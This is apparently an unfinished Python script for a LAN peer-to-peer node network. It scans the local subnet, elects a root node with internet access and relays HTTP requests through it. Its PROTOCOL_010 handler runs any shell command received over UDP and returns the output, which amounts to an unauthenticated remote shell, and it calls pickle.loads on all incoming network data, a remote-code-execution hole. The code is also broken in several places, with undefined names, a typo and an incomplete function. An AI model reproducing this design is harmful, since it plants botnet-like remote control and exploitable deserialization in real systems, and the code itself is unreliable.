import socket
import numpy as np
import pickle
import os
import threading
import requests
import time
import subprocess

__version__ = "0.0.1"

class Node(object):
    baseport = 12000
    protocol_001_clTimeout = 0.1
    BaseProtocolTimeOut = 2
    
    def __init__(self):
        self.http_url = "https://www.google.com/" #temprorily
        self.httpServerAccess = False
        self.run = True
        self.max_nodes = 10
        self.address = socket.gethostbyname(socket.gethostname())
        self.base_address = '.'.join(self.address.split('.')[:-1])
        self.port = Node.baseport + int(self.address.split('.')[-1])
        self.nodeID = int(self.address.split('.')[-1])
        self.nodes = dict() 
        self.node_info = []
        self.netstat = self.SUBROUTINE_PROTOCOL_000()
        self.nodeVec = np.random.random()
        self.RootNode = False
        self.RootNodeAddr = None
        self.NoRootNode = True
        self.conode = (self.address,self.netstat,self.nodeVec)
        self.UDPServer = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self.UDPClient = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self.UDPServer.bind((self.address,self.port))
        self.n_nodes = 0
        self.PROTOCOLS = {
            "000":self.SUBROUTINE_PROTOCOL_000,
            "001":self.SUBROUTINE_HANDLESERVERCALL_PROTOCOL001,
            "003":self.PROTOCOL_003,

            "010":self.PROTOCOL_010,
            "011":self.PROTOCOL_011,
            "012":self.PROTOCOL_012,
            "014":self.PROTOCOL_014,
            }
        self.UDPServerThread = threading.Thread(target=self.UDPSERVER_CALL_ROUTINES)
        self.UDPServerThread.start()
        if (not self.netstat)&self.NoRootNode:
            self.ReTryNetworkThread = threading.Thread(target=self.SUBROUTINE_004)
            self.ReTryNetworkThread.start()
        self.SUBROUTINE_PROTOCOL_001()

    def UPDATE_NODE_PROTOCOL(self,nodes):             #NODES = {addr:(addr,nstat,vec)}
        self.nodes.update(nodes)
        
    def UDPSERVER_CALL_ROUTINES(self):
        try:
            print(self.address,self.port)
            while self.run:
                data,addr = self.UDPServer.recvfrom(4096)
                data = pickle.loads(data)
                [header,_] = data
                print("data recieved",header)
                self.PROTOCOLS[header["protocol"]](data,addr)
        except OSError:
            return 0
            
    def SUBROUTINE_PROTOCOL_000(self):
        try:
            socket.create_connection(("1.1.1.1", 53)) #google.com ::may change to -
            return True                               # - http server address
        except OSError:
            pass
        return False
    
    def SUBROUTINE_HANDLESERVERCALL_PROTOCOL001(self,data,addr):
        [header,body] = data
        msg = [{"protocol":"001","code":1},[self.nodes,self.netstat,self.nodeVec]]
        bytes_msg = pickle.dumps(msg)
        self.UDPServer.sendto(bytes_msg,addr)
        [conodes,netstat,nodeVec] = body
        node = (addr[0],netstat,nodeVec)
        self.UPDATE_NODE_PROTOCOL({addr[0]:node})
        self.UPDATE_NODE_PROTOCOL(conodes)
        try:
            del self.nodes[self.address]
        except KeyError:
            pass
        self.n_nodes = len(self.nodes)
        return self.SUBROUTINE_002()
        
    def SUBROUTINE_PROTOCOL_001(self,*args):
        s = self.UDPClient
        s.settimeout(Node.protocol_001_clTimeout)
        msg = [{"protocol":"001","code":1},[self.nodes,self.netstat,self.nodeVec]]
        bytes_msg = pickle.dumps(msg)
        i = self.nodeID+1
        j = self.nodeID-1
        while i<self.max_nodes:
            addr = self.base_address+'.'+str(i)
            port = Node.baseport + i
            if (i!= self.nodeID)&(addr not in self.nodes):
                try:
                    s.sendto(bytes_msg,(addr,port))
                    [header,[conodes,netstat,nodeVec]] = pickle.loads(s.recvfrom(4096)[0]) 
                    node = (addr,netstat,nodeVec) 
                    self.UPDATE_NODE_PROTOCOL({addr:node})
                    self.UPDATE_NODE_PROTOCOL(conodes)
                except OSError as e:
                    pass
            i+=1
        while j>=0:
            addr = self.base_address+'.'+str(j)
            port = Node.baseport + j
            if (j!= self.nodeID)&(addr not in self.nodes):
                try:
                    s.sendto(bytes_msg,(addr,port))
                    [header,[conodes,netstat,nodeVec]] = pickle.loads(s.recvfrom(4096)[0]) 
                    node = (addr,netstat,nodeVec) 
                    self.UPDATE_NODE_PROTOCOL({addr:node})
                    self.UPDATE_NODE_PROTOCOL(conodes)                   
                except OSError as e:
                    pass
            j-=1
        try:
            del self.nodes[self.address]
        except KeyError:
            pass
        self.n_nodes = len(self.nodes)
        self.UDPClient.settimeout(Node.BaseProtocolTimeOut)
        return self.SUBROUTINE_002()

    def SUBROUTINE_002(self):
        self.RootNode = False
        nodes = np.array(list(self.nodes))
        network = np.array([i[1] for i in list(self.nodes.values())])
        nodeVec = np.array([i[2] for i in list(self.nodes.values())])
        sel_node = nodes[network>0]
        sel_Vec = nodeVec[network>0]
        max_sel = 0
        if not np.array_equal(np.array([]),sel_Vec):
            max_sel = np.max(sel_Vec)
            if (max_sel<self.nodeVec)&self.netstat:
                self.RootNode = True
                self.RootNodeAddr = self.address,self.port
                self.NoRootNode = False
                return self.SUBROUTINE_003()
            node = sel_node[np.argmax(sel_Vec)]
            self.RootNodeAddr = node,PortHashing(node)
            self.NoRootNode = False

    def SUBROUTINE_003(self):
        if requests.get(self.http_url).status_code == 200:
            self.httpServerAccess

    def SUBROUTINE_004(self): 
        while (self.NoRootNode)&self.run:
            self.netstat = self.SUBROUTINE_PROTOCOL_000()
            if self.netstat:
                return self.SUBROUTINE_005()

    def SUBROUTINE_005(self):
        self.run = False
        self.UDPServer.close()
        return self.__init__()

    def PROTOCOL_003(self,data=None,addr=None,init=False):
        if init:
            NodeList = list(self.nodes)
            msg = [{"protocol":"003","code":1,"init":True},NodeList]
            bytes_msg = pickle.dumps(msg)
            for i in range(len(self.nodes)):
                self.UDPClient.sendto(bytes_msg,(NodeList[i],PortHashing(NodeList[i],Node.baseport)))
                self.UDPClient.recvfrom(4096)
            return self.SUBROUTINE_005()
        else:
            msg = [{"protocol":"003","code":1,"init":False},0]
            bytes_msg = pickle.dumps(msg)
            self.UDPServer.sendto(bytes_msg,addr)
            [header,NodeListGet] = data
            NodeList = list(self.nodes)
            msg = [{"protocol":"003","code":1,"init":False},NodeList]
            bytes_msg = pickle.dumps(msg)
            NodeListGet.append(addr[0])
            for i in range(len(self.nodes)):
                if NodeList[i] not in NodeListGet:
                    self.UDPClient.sendto(bytes_msg,(NodeList[i],PortHashing(NodeList[i],Node.baseport)))
                    self.UDPClient.recvfrom(4096)
            return self.SUBROUTINE_005()

    def PROTOCOL010_EXEC_THREAD(self,cmd,data,addr):
        try:
            [header,cmd]=data
            output = subprocess.check_output(cmd,shell=1,text=True)
            header = {"protocol":"010","status":1}
            data = pickle.dumps(output)
            self.UDPServer.sendto(data,addr)
        except subprocess.CalledProcessError as e:
            header = {"protocol":"010","status":0}
            data = pickle.dumps(str(e))
            self.UDPServer.sendto(data,addr)
        
    def PROTOCOL_010(self,data,addr):
        thread = Threading.Thread(target=self.PROTOCOL010_EXEC_THREAD,args=(cmd,data,addr,))
        thread.start()
        
    def PROTOCOL_011(self,data,addr):
        [header,body] = data
        body = pickle.dumps(body)
        r = requests.post(self.http_url,body,headers=header)
        data = [r.headers,r.text]
        self.UDPServer.sendto(pickle.dumps(data),addr)

    def PROTOCOL_012(self,data,addr):
        [header,data] = data
        header["protocol"] = header["sub-protocol"]
        data = pickle.dumps([header,data])
        dest_addr = header["dest_addr"]
        self.UDPClient.sendto(data,(dest_addr,PortHashing(dest_addr)))
        data = self.UDPClient.recvfrom(4096)
        self.UDPServer.sendto(data,addr)
        
    def PROTOCOL_014(self,data,addr):
        if self.n_nodes>3:
            if n>1:
                [header,body] = data
                history = header['history']
                n = header['n']
                nodeset = set(self.nodes)
                others = list(nodeset-history)
                nex = others[np.random.randint(0,len(others))]
                header['n'] = n+1
                header['history'].append(self.address)
                data = pickle.dumps([header,body])
                self.UDPClient.sendto(data,(nex,PortHashing(nex)))
                data = self.UDPClient.recvfrom(4096)
                self.UDPServer.sendto(data,addr)
            if n==1:
                return self.PROTOCOL_012(data,addr)
        return self.PROTOCOL_012(data,addr)

    def PROTOCOL_011_REQUESTS(self,data):
        header = {"protocol":"011"}
        data = pickle.dumps([header,data])
        self.UDPClient.sendto(data,self.RootNodeAddr)
        data = pickle.loads(self.UDPClient.recvfrom(4096)[0])
        return data

    def SUBROUTINE_006(self):
        w = open("browserCheck","w")
        while True:
            w.seek(0)
            if w.read()==1:

    def PROTOCOL_015(self,data,addr):
        [header,body] = data
        body = pickle.dumps(body)
        r = requests.get(header["url"],headers=header)
        data = [r.headers,r]
        self.UDPServer.sendto(pickle.dumps(data),addr)
        
        
#send file,recv file
#broadcast
#thread command
def PortHashing(addr,baseport=Node.baseport):
    return baseport + int(addr.split('.')[-1])

t = time.time()
n = Node()
print(time.time()-t)
